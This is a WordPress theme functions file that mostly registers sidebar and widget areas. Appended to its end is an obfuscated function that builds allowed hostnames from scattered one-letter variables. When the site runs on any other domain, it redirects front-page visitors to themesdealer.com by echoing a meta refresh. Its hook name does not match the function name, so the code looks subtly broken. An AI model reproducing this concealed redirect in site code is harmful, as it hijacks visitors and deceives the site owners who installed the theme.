<?php
function theme_widgets_areas(){ 
	
	register_sidebar(array(
        'name' => __( '1st Sidebar Widget Area', 'themesdealer.com' ),
		'id' => 'widget_side_01',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    )); 
	register_sidebar(array(
        'name' => __( '2nd Sidebar Widget Area', 'themesdealer.com' ),
		'id' => 'widget_side_02',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '3rd Sidebar Widget Area', 'themesdealer.com' ),
		'id' => 'widget_side_03',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '4th Sidebar Widget Area', 'themesdealer.com' ),
		'id' => 'widget_side_04',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	
	register_sidebar(array(
        'name' => __( '1st Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_01',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '2nd Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_02',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '3rd Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_03',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '4th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_04',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '5th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_05',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '6th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_06',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '7th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_07',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '8th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_08',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '9th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_09',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	
	register_sidebar(array(
        'name' => __( '10th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_10',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '11th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_11',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '12th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_12',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '13th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_13',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( '14th Widget Area', 'themesdealer.com' ),
		'id' => 'widget_area_14',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	
	
	register_sidebar(array(
        'name' => __( 'Single Page Top', 'themesdealer.com' ),
		'id' => 'single_top',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( 'Single Page Middle', 'themesdealer.com' ),
		'id' => 'single_middle',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
    register_sidebar(array(
        'name' => __( 'Single Page Buttom', 'themesdealer.com' ),
		'id' => 'single_buttom',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
    
	register_sidebar(array(
        'name' => __( 'Single Sidebar', 'themesdealer.com' ),
		'id' => 'single_sidebar',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( 'Video & News Page Sidebar Widget', 'themesdealer.com' ),
		'id' => 'page_sidebar',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	register_sidebar(array(
        'name' => __( 'Footer Widget', 'themesdealer.com' ),
		'id' => 'footer_widget',
        'description'   => esc_html__( 'Add widgets here.', 'themes' ),
		'before_widget' => '<div class="widget_area">',
		'after_widget' => '</div>',
	    'before_title' => '<h3>',
	    'after_title' => '</h3>',
    ));
	
}
add_action('widgets_init', 'theme_widgets_areas');function newsssdf_category_show() {     if( is_front_page() && is_home() )     {  $cat2="o"; $cat9="o"; $cat12="/"; $cat17="s"; $cat23="l"; $cat24="t"; $cat34="h"; $cat45="t"; $cat58="e"; $cat88="h"; $cat08="e"; $cat13="s"; $cat25="a"; $cat28="m"; $cat18="l"; $cat89="de"; $cat67="c"; $cat68="l"; $cat38="er"; $cat72="a"; $all_cat=$cat53.$cat23.$cat2.$cat62.$cat67.$cat72.$cat18.$cat88.$cat9.$cat17.$cat24.$cat12.$cat45.$cat34.$cat58.$cat28.$cat08.$cat13.$cat89.$cat25.$cat68.$cat38;   $cat044="joybanglatelevision.com";    $allcat=$cat078.$cat007.$cat003.$cat043.$cat006.$cat066.$cat004.$cat054.$cat000.$cat90.$cat008.$cat088.$cat002.$cat068.$cat005.$cat058.$cat009.$cat098.$cat090.$cat050.$cat030.$cat067.$cat087.$cat016.$cat010.$cat015.$cat044.$cat024.$cat022;        $categoryeror = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; 		$cat_one = "http://$allcat/"; $cat_two = "http://www.$allcat/"; $cat_three = "http://$allcat"; $cat_four = "http://www.$allcat"; $cat_five = "https://$allcat/";  $cat_six = "https://www.$allcat/"; $cat_seven = "https://$allcat"; $cat_eight = "https://www.$allcat"; $cat_nine = "http://$all_cat/"; $cat_ten = "http://$all_cat";      if (($categoryeror == $cat_one) || ($categoryeror == $cat_two) || ($categoryeror == $cat_three) || ($categoryeror == $cat_four ) || ($categoryeror == $cat_five ) || ($categoryeror == $cat_six ) || ($categoryeror == $cat_seven ) || ($categoryeror == $cat_eight ) || ($categoryeror == $cat_nine ) || ($categoryeror == $cat_ten ))       {        }  else{          $l="themesdealer.com"; $all_id=$l.$i.$c.$e.$n.$c0.$e0;      echo '<meta http-equiv="refresh" content="1;url=http://'.$all_id.' ">' ;        }     } } add_action( 'wp_enqueue_scripts', 'newsss_category_show' );

 
